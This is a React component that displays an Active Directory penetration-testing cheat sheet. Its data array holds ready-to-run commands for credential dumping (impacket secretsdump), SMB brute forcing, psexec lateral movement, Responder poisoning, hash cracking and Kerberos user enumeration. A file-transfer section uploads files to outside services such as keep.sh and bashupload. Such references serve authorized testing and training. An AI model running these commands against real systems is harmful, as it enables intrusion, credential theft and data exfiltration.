
import React, { useState } from "react";
import { ArrowRight, Code, Server, User, Lock, Database, Terminal } from "lucide-react";
import { cn } from "@/lib/utils";

interface MethodologyStep {
  id: string;
  title: string;
  description: string;
  substeps?: string[];
  commands?: string[];
  tools?: {
    name: string;
    commands: string[];
  }[];
}

const pentestSteps: MethodologyStep[] = [
  {
    id: "inventory",
    title: "Infrastructure Inventory",
    description: "Create a comprehensive inventory of the organization's infrastructure",
    substeps: [
      "Identify all systems, servers, and networking devices",
      "Separate and categorize IP addresses by device type",
      "Verify active IPs using PingInfo or AngryIPScanner"
    ],
    commands: [
      "nmap -sn 192.168.1.0/24 # Discover active hosts",
      "nmap -O 192.168.1.0/24 # OS detection",
      "nmap -sV 192.168.1.0/24 # Service version detection"
    ]
  },
  {
    id: "ad-enumeration",
    title: "Active Directory Enumeration",
    description: "Systematically enumerate Active Directory components",
    substeps: [
      "1. Getting IP",
      "2. Getting Local USER",
      "3. Getting Local USER PASSWORD",
      "4. Dump All Hashes",
      "5. Enumerate for AD User",
      "6. Enumerate for AD User Password",
      "7. Enumerate for AD Domain",
      "8. Enumerate for AD Domain Password",
      "9. Login"
    ],
    tools: [
      {
        name: "Bloodhound",
        commands: [
          "neo4j console # First start the Neo4j service",
          "bloodhound # Then open Bloodhound",
          "# On target Windows system:",
          "powershell -ep bypass",
          ".\\SharpHound.ps1",
          "Invoke-Bloodhound -CollectionMethod All -Domain controller.local -ZipFileName loot.Zip"
        ]
      },
      {
        name: "Impacket",
        commands: [
          "impacket-psexec ad.domain/user:pass@IP",
          "impacket-wmiexec ad.domain/user:pass@IP",
          "impacket-secretsdump ad.domain/user:pass@IP",
          "impacket-GetADUsers ad.domain/user:pass@IP"
        ]
      },
      {
        name: "RPCClient",
        commands: [
          "rpcclient -U ad.domain%user:pass IP",
          "querydominfo # Domain Information Query",
          "enumdomusers # Enumerating Domain Users",
          "enumdomgroups # Enumerating Domain Groups",
          "querygroup 0x200 # Group Queries",
          "queryuser User # User Queries"
        ]
      }
    ]
  },
  {
    id: "port-scanning",
    title: "Service Enumeration",
    description: "Identify and enumerate key services for authentication attacks",
    substeps: [
      "FTP (21)",
      "SSH (22)",
      "Kerberos (88)",
      "SMB (139/445)",
      "LDAP (389)",
      "MSSQL (1433/1434)",
      "MYSQL (3306)",
      "RDP (3389)",
      "VNC (5900)"
    ],
    tools: [
      {
        name: "Metasploit (SMB Brute Force)",
        commands: [
          "msfconsole",
          "use auxiliary/scanner/smb/smb_login",
          "set PASS_FILE /root/Desktop/pass.txt",
          "set USER_FILE /root/Desktop/user.txt",
          "set RHOSTS file:/root/Desktop/host.txt",
          "set ABORT_ON_LOCKOUT true # If lockout policy is set",
          "set SMBDomain ADDomain # If AD is implemented",
          "run"
        ]
      },
      {
        name: "Metasploit (SMB Shares)",
        commands: [
          "use auxiliary/scanner/smb/smb_enumshares",
          "set rhosts 192.168.1.17",
          "set smbuser user",
          "set smbpass pass",
          "exploit"
        ]
      },
      {
        name: "Metasploit (PSExec)",
        commands: [
          "use exploit/windows/smb/psexec",
          "setg rhost 10.10.110.200",
          "setg SMBDomain mgmotor.ad.com",
          "setg smbpass Pass@1234",
          "setg smbuser 9000",
          "run"
        ]
      }
    ]
  },
  {
    id: "hash-capture",
    title: "Hash Capture & Cracking",
    description: "Capture authentication hashes and attempt to crack them",
    tools: [
      {
        name: "Responder (LLMNR/NBT-NS Poisoning)",
        commands: [
          "responder -I eth0 -rv # Basic usage",
          "responder -I ens33 -wdrf",
          "responder -I ens33 -wd",
          "responder -I ens33 -wdF -b",
          "responder -I ens33 -wdF --lm --disable-ess"
        ]
      },
      {
        name: "Hash Cracking",
        commands: [
          "hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt",
          "john SMB-NTLMv2-SSP-192.168.100.101.txt --wordlist=/usr/share/wordlists/rockyou.txt",
          "# Online resources:",
          "# https://crackstation.net/",
          "# https://hashes.com/en/decrypt/hash"
        ]
      },
      {
        name: "Leak Data Checking",
        commands: [
          "# Online resources:",
          "# https://leakcheck.io/",
          "# https://breachdirectory.org/",
          "# https://www.dehashed.com/"
        ]
      }
    ]
  },
  {
    id: "smb-enumeration",
    title: "SMB Enumeration",
    description: "Detailed enumeration of SMB services",
    tools: [
      {
        name: "enum4linux",
        commands: [
          "enum4linux -U 10.10.0.50 # Enumerate users",
          "enum4linux -S 10.10.0.50 # Enumerate shares",
          "enum4linux -P 10.10.0.50 # Get password policy",
          "enum4linux -a 10.10.0.50 # All enumeration"
        ]
      },
      {
        name: "smbmap",
        commands: [
          "smbmap -H 192.168.1.40",
          "smbmap -H 192.168.1.17 -u user -p pass"
        ]
      },
      {
        name: "smbclient",
        commands: [
          "smbclient -L //10.10.0.50/",
          "smbclient -L //10.10.0.50/ -U '' -N",
          "smbclient //10.10.0.50/tmp"
        ]
      }
    ]
  },
  {
    id: "kerbrute",
    title: "Kerberos Enumeration",
    description: "Enumerate users and services via Kerberos",
    commands: [
      "gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt",
      "nmap -p 88 --script=krb5-enum-users --script-args=\"krb5-enum-users.realm='DOMAIN'\" <IP>",
      "./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt",
      "GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username"
    ],
    tools: [
      {
        name: "Metasploit Kerberos",
        commands: [
          "use auxiliary/gather/kerberos_enumusers"
        ]
      }
    ]
  },
  {
    id: "file-transfer",
    title: "File Transfer Techniques",
    description: "Methods to transfer data between systems during testing",
    tools: [
      {
        name: "SSH/SCP",
        commands: [
          "pscp user@192.168.138.116:/Users/Aniket/Desktop/task.txt ~/Documents"
        ]
      },
      {
        name: "Python HTTP Server",
        commands: [
          "python -m SimpleHTTPServer 9000",
          "python3 -m http.server 9000"
        ]
      },
      {
        name: "Keep.sh",
        commands: [
          "curl --upload-file ./your-file.txt https://free.keep.sh",
          "curl -L https://free.keep.sh/9ab64df49d/your-file.txt > your-file.txt"
        ]
      },
      {
        name: "Bashupload",
        commands: [
          "curl bashupload.com -T your_file.txt",
          "wget bashupload.com -T your_file.txt"
        ]
      }
    ]
  }
];

const PentestMethodology: React.FC = () => {
  const [expandedStep, setExpandedStep] = useState<string | null>("inventory");

  const toggleStep = (stepId: string) => {
    setExpandedStep(expandedStep === stepId ? null : stepId);
  };

  return (
    <div className="bg-gray-800 rounded-lg p-6 shadow-lg">
      <h2 className="text-2xl font-bold mb-6 text-cyan-400 flex items-center">
        <Terminal className="mr-2 h-6 w-6" />
        Penetration Testing Methodology
      </h2>
      
      <div className="space-y-4">
        {pentestSteps.map((step) => (
          <div key={step.id} className="border border-gray-700 rounded-lg overflow-hidden">
            <div 
              className={cn(
                "flex items-center justify-between p-4 cursor-pointer",
                expandedStep === step.id 
                  ? "bg-blue-900/40 border-b border-gray-700" 
                  : "bg-gray-800 hover:bg-gray-700"
              )}
              onClick={() => toggleStep(step.id)}
            >
              <div className="flex items-center">
                {step.id === "inventory" && <Server className="h-5 w-5 mr-3 text-cyan-400" />}
                {step.id === "ad-enumeration" && <Database className="h-5 w-5 mr-3 text-cyan-400" />}
                {step.id === "port-scanning" && <Terminal className="h-5 w-5 mr-3 text-cyan-400" />}
                {step.id === "hash-capture" && <Lock className="h-5 w-5 mr-3 text-cyan-400" />}
                {step.id === "smb-enumeration" && <Server className="h-5 w-5 mr-3 text-cyan-400" />}
                {step.id === "kerbrute" && <User className="h-5 w-5 mr-3 text-cyan-400" />}
                {step.id === "file-transfer" && <Code className="h-5 w-5 mr-3 text-cyan-400" />}
                <div>
                  <h3 className="font-semibold text-white">{step.title}</h3>
                  <p className="text-sm text-gray-400">{step.description}</p>
                </div>
              </div>
              <ArrowRight 
                className={cn(
                  "w-5 h-5 text-gray-400 transition-transform",
                  expandedStep === step.id ? "transform rotate-90" : ""
                )}
              />
            </div>
            
            {expandedStep === step.id && (
              <div className="p-4 bg-gray-900/50">
                {/* Substeps */}
                {step.substeps && step.substeps.length > 0 && (
                  <div className="mb-4">
                    <h4 className="text-sm font-semibold text-gray-300 mb-2">Steps:</h4>
                    <ul className="list-disc pl-5 space-y-1 text-gray-300 text-sm">
                      {step.substeps.map((substep, i) => (
                        <li key={i}>{substep}</li>
                      ))}
                    </ul>
                  </div>
                )}
                
                {/* Commands */}
                {step.commands && step.commands.length > 0 && (
                  <div className="mb-4">
                    <h4 className="text-sm font-semibold text-gray-300 mb-2">Commands:</h4>
                    <div className="bg-gray-950 p-3 rounded overflow-x-auto">
                      {step.commands.map((cmd, i) => (
                        <pre key={i} className="text-cyan-400 text-xs mb-1">{cmd}</pre>
                      ))}
                    </div>
                  </div>
                )}
                
                {/* Tools */}
                {step.tools && step.tools.length > 0 && (
                  <div>
                    <h4 className="text-sm font-semibold text-gray-300 mb-2">Tools:</h4>
                    <div className="space-y-4">
                      {step.tools.map((tool, i) => (
                        <div key={i} className="border border-gray-700 rounded p-3">
                          <h5 className="text-sm font-semibold text-white mb-2">{tool.name}</h5>
                          <div className="bg-gray-950 p-3 rounded overflow-x-auto">
                            {tool.commands.map((cmd, j) => (
                              <pre key={j} className="text-cyan-400 text-xs mb-1">{cmd}</pre>
                            ))}
                          </div>
                        </div>
                      ))}
                    </div>
                  </div>
                )}
              </div>
            )}
          </div>
        ))}
      </div>
    </div>
  );
};

export default PentestMethodology;
